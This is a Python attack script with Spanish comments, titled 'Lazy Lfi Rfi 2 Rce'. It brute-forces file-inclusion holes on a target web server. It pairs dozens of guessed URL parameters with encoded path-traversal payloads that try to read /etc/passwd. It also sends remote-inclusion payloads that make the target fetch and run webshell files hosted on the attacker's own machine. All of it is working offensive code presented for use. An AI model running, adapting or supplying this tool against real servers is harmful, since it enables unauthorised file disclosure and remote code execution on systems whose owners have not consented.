import argparse
import urllib.parse
import requests
import signal
import sys
from os import path
BANNER = """
,-.      .--.   _____.-.   .-. .---.  .-.  .-..-. .-.               
| |     / /\ \ /___  /\ \_/ )// .-. ) | |/\| ||  \| |               
| |    / /__\ \   / /) \   (_)| | |(_)| /  \ ||   | |               
| |    |  __  |  / /(_) ) (   | | | | |  /\  || |\  |               
| `--. | |  |)| / /___  | |   \ `-' / |(/  \ || | |)|               
|( __.'|_|  (_)(_____/ /(_|    )---'  (_)   \|/(  (_)               
(_)                   (__)    (_)            (__)                   
,-.      .--.   _____.-.   .-.,-.    ,---.,-.2,---.   ,--,  ,---.   
| |     / /\ \ /___  /\ \_/ )/| |    | .-'|(| | .-.\.' .')  | .-'   
| |    / /__\ \   / /) \   (_)| |    | `-.(_) | `-'/|  |(_) | `-.   
| |    |  __  |  / /(_) ) (   | |    | .-'| | |   ( \  \    | .-'   
| `--. | |  |)| / /___  | |   | `--. | |  | | | |\ \ \  `-. |  `--. 
|( __.'|_|  (_)(_____/ /(_|   |( __.')\|  `-' |_| \)\ \____\/( __.' 
(_)                   (__)    (_)   (__)          (__)     (__)  
[*] Iniciando: Lazy Lfi Rfi 2 Rce [;,;]
"""
print(BANNER)

def signal_handler(sig, frame):
    print("\n [<-] Saliendo...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def check_lfi_success(response_text):
    # Comprobamos si el contenido típico de /etc/passwd está presente en la respuesta
    return "root:x:0:0" in response_text

def check_rfi_success(response_text):
    # Comprobamos si el contenido específico del archivo remoto está presente en la respuesta
    return "lazywebshell" in response_text

def main():
    # Definir los argumentos del script
    parser = argparse.ArgumentParser(description='Generar vectores de ataque LFI/RFI.')
    parser.add_argument('--rhost', type=str, required=True, help='Dirección del host remoto vulnerable')
    parser.add_argument('--rport', type=int, required=True, help='Puerto del host remoto vulnerable')
    parser.add_argument('--lhost', type=str, required=True, help='Dirección del host local para RFI')
    parser.add_argument('--lport', type=int, required=True, help='Puerto del host local para RFI')
    parser.add_argument('--field', type=str, required=True, help='Nombre del campo de archivo en la URL')
    parser.add_argument('--wordlist', type=str, required=True, help='diccionario para fuerza bruta' )
    args = parser.parse_args()

    # Construir la URL base con diferentes campos

    base_urls = [
        f"http://{args.rhost}:{args.rport}/?{args.field}=",
        f"http://{args.rhost}:{args.rport}/?cat=",
        f"http://{args.rhost}:{args.rport}/?dir=",
        f"http://{args.rhost}:{args.rport}/?action=",
        f"http://{args.rhost}:{args.rport}/?board=",
        f"http://{args.rhost}:{args.rport}/?date=",
        f"http://{args.rhost}:{args.rport}/?detail=",
        f"http://{args.rhost}:{args.rport}/?file=",
        f"http://{args.rhost}:{args.rport}/?download=",
        f"http://{args.rhost}:{args.rport}/?path=",
        f"http://{args.rhost}:{args.rport}/?folder=",
        f"http://{args.rhost}:{args.rport}/?prefix=",
        f"http://{args.rhost}:{args.rport}/?include=",
        f"http://{args.rhost}:{args.rport}/?page=",
        f"http://{args.rhost}:{args.rport}/?inc=",
        f"http://{args.rhost}:{args.rport}/?locate=",
        f"http://{args.rhost}:{args.rport}/?show=",
        f"http://{args.rhost}:{args.rport}/?doc=",
        f"http://{args.rhost}:{args.rport}/?site=",
        f"http://{args.rhost}:{args.rport}/?type=",
        f"http://{args.rhost}:{args.rport}/?view=",
        f"http://{args.rhost}:{args.rport}/?content=",
        f"http://{args.rhost}:{args.rport}/?document=",
        f"http://{args.rhost}:{args.rport}/?layout=",
        f"http://{args.rhost}:{args.rport}/?mod=",
        f"http://{args.rhost}:{args.rport}/?conf="
    ]
    if path.exists(args.wordlist):
        wordlist = open(args.wordlist, 'r')
        wordlist = wordlist.read().split('\n')
        for s in wordlist:
            base_urls.append(f"http://{args.rhost}:{args.rport}/?{s}=")
            base_urls.append(f"http://{args.rhost}:{args.rport}/{s}/?{s}=")
    # Definir los vectores de ataque LFI
    lfi_vectors = [
        "../../../etc/passwd",
        "../../../etc/passwd%00",
        "%252e%252e%252fetc%252fpasswd",
        "%252e%252e%252fetc%252fpasswd%00",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
        "../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../etc/passwd%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00"
    ]

    # Definir los vectores de ataque RFI
    rfi_vectors = [
        f"http://{args.lhost}:{args.lport}/cgi-bin/lazywebshell.py",
        f"http://{args.lhost}:{args.lport}/cgi-bin/lazywebshell.sh",
        f"http:%252f%252f{args.lhost}%252fshell.txt",
        f"\\\\{args.lhost}\\share\\shell.php",
        f"http://{args.lhost}:{args.lport}/cgi-bin/lazywebshell.cgi",
        f"http://{args.lhost}:{args.lport}/cgi-bin/lazywebshell.asp",
        f"http:%252f%252f{args.lhost}%252fmalicious.txt",
        f"\\\\{args.lhost}\\share\\malicious.php"
    ]

    # Generar y verificar las URLs LFI
    print("[;,;] LFI Vectors:")
    for base_url in base_urls:
        for vector in lfi_vectors:
            lfi_url = base_url + urllib.parse.quote(vector)
            lfi_r = requests.get(lfi_url)
            cabeceras = dict(lfi_r.headers)
            for x in cabeceras:
                print("[h] " + x + " : " +cabeceras[x])
            print(lfi_url)
            if check_lfi_success(lfi_r.text):
                print("[;,;] LFI successful!")
            else:
                print("[:(] LFI failed.")

    # Generar y verificar las URLs RFI
    print("\n[;,;] RFI Vectors:")
    for base_url in base_urls:
        for vector in rfi_vectors:
            rfi_url = base_url + urllib.parse.quote(vector)
            print(rfi_url)
            rfi_r = requests.get(rfi_url)
            cabeceras = dict(rfi_r.headers)
            for x in cabeceras:
                print("[h] "+ x + " : " +cabeceras[x])
            if check_rfi_success(rfi_r.text):
                print("[;,;] RFI successful!")
            else:
                print("[:(] RFI failed.")

if __name__ == "__main__":
    main()
